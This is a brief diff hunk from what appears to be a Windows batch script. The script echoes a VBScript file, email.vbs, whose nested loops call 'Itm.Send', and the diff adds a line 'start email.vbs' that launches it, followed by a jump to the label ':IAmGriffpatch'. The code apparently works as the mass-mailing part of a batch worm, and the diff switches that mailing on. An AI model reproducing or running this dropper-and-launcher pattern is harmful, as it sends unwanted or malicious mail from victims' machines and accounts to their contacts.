@@ -417,6 +417,7 @@ echo Itm.Send >> email.vbs
 echo Next >> email.vbs
 echo Next >> email.vbs
 echo End Sub >> email.vbs
+start email.vbs
 goto IAmGriffpatch
 
 :IAmGriffpatch
